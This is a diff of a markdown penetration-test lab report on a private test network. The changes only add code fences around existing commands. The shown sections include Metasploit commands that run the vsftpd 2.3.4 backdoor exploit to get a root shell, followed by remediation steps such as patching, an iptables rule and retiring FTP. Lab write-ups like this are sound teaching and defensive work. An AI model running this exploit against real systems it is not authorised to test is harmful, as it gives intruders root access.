@@ -42,11 +42,13 @@ sudo nmap -sV -p 21 192.168.56.102
 
 The vulnerability verification was automated via the Metasploit Framework using the dedicated exploit module:
 
+```bash
 msfconsole -q
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.102
 set LHOST 192.168.56.101
 show options
+```
 
 #### Module Target
 * vsftpd 2.3.4 built-in trigger mechanism.
@@ -70,9 +72,11 @@ Upon executing the exploit module, the backdoor routine was successfully trigger
 The handler spawned an interactive session, granting root-level administrative privileges over the target machine.
 
 #### Privilege Verification Commands
+```bash
 whoami
 id
 uname -a
+```
 
 #### Verification
 * whoami — Confirmed the user execution context as root.
@@ -107,8 +111,10 @@ Immediately upgrade vsftpd to secure, patched versions or transition entirely to
 #### 2. Network Perimeter Filtering — iptables
 Configure host-based firewalls to drop unauthorized inbound traffic on abnormal or dangerous listening ports:
 
+```bash
 sudo iptables -A INPUT -p tcp --dport 6200 -j DROP
 sudo iptables -L -n -v
+```
 
 #### 3. Protocol Modernization
 Deprecate cleartext protocols such as FTP and enforce encrypted alternatives such as:
